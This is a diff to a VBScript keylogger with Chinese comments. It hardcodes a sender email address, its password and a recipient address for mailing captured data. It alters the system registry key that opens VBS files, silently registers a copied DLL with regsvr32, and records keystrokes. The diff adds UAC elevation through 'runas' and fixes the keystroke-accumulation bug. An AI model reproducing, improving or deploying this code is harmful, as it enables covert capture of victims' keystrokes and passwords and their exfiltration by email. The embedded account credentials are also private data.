@@ -1,3 +1,5 @@
+Option Explicit
+
 '++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 '+++++++++++++++++++++++++++++++++++++初始化配置区域+++++++++++++++++++++++++++++++++++++++
 
@@ -9,8 +11,31 @@ Const DYN_WRAP_DLL	 		= "dynwrap.dll"			'dynamic wrapper的文件名
 Const SENDER_MAIL_ADDRESS	= "2637252534@qq.com"	'用于发送邮件的邮箱地址
 Const SENDER_MAIL_PASSWORD 	= "wzc123456"         	'用于发送邮件的邮箱密码
 Const SENDEE_MAIL_ADDRESS  	= "610955867@qq.com" 	'用于接收邮件的邮箱地址
-Const DEFAULT_VBS_OPEN_COMMAND_KEY	= "HKLM\SOFTWARE\Classes\vbsfile\shell\open\command"
+Const DEFAULT_VBS_OPEN_COMMAND_KEY	= "HKLM\SOFTWARE\Classes\vbsfile\shell\open\command\"
 Const CUSTOM_VBS_OPEN_COMMAND_VALUE = """%SystemRoot%\SysWOW64\wscript.exe"" ""%1"" %*"
+
+'*********************************** 提升脚本运行权限 *************************************
+
+Dim g_isRunningWithoutUAC '
+g_isRunningWithoutUAC = False
+
+Call DoUACRunScript()
+
+Sub DoUACRunScript()
+	Dim objOS
+	For Each objOS in GetObject("winmgmts:").InstancesOf("Win32_OperatingSystem") 
+		If InStr(objOS.Caption,"XP") = 0 Then 
+			If WScript.Arguments.length = 0 Then 
+				Dim objShell 
+				Set objShell = CreateObject("Shell.Application")
+				objShell.ShellExecute "wscript.exe", Chr(34) &_
+				WScript.ScriptFullName & Chr(34) & " uac", "", "runas", 1
+				Set objShell = Nothing
+				g_isRunningWithoutUAC = True
+			End If
+		End If
+	Next
+End Sub
 
 '*********************************** 强制程序以32位启动 ************************************
 
@@ -20,6 +45,7 @@ g_isRunningOnX86 = False
 Call OpenWithX86()
 
 Sub OpenWithX86() '主函数，强制程序以32位WScript.exe解释执行
+	If g_isRunningWithoutUAC = True Then Exit Sub
 	If X86orX64() = "X64" Then
 		If ReadReg(DEFAULT_VBS_OPEN_COMMAND_KEY) <> CUSTOM_VBS_OPEN_COMMAND_VALUE Then
 			WScript.Echo("Using WScript.exe 64")
@@ -62,7 +88,7 @@ Sub RegisterCOM(strSource)			'注册组件
 		strSystem32Dir = objWshShell.ExpandEnvironmentStrings("%WinDir%") & "\SysWOW64\"
 	End If
 	
-	If Not objFileSystem.FileExists(strSystem32Dir & DYN_WRAP_DLL) Then 
+	If Not objFileSystem.FileExists(strSystem32Dir & DYN_WRAP_DLL) Then
 		objFileSystem.CopyFile strSource, strSystem32Dir, False
 		WScript.Sleep 1000
 	End If
@@ -71,6 +97,7 @@ Sub RegisterCOM(strSource)			'注册组件
 	blnComplete = False
 	Do
 		If objFileSystem.FileExists(strSystem32Dir & DYN_WRAP_DLL) Then
+			Dim regSvrPath
 			regSvrPath = strSystem32Dir & "regsvr32.exe /s "
 			objWshShell.Run regSvrPath & strSystem32Dir & DYN_WRAP_DLL
 			blnComplete = True
@@ -123,7 +150,7 @@ Sub RecordKeyboard()
 		Dim TheKey
 		theKey = ""
 		theKey = GetThePressKey()
-		g_theKeyResult = theKeyResult & theKey
+		g_theKeyResult = g_theKeyResult & theKey
 		WScript.Sleep 20
 	Loop Until theKey = "[ENTER]"
 	WScript.Echo g_theKeyResult
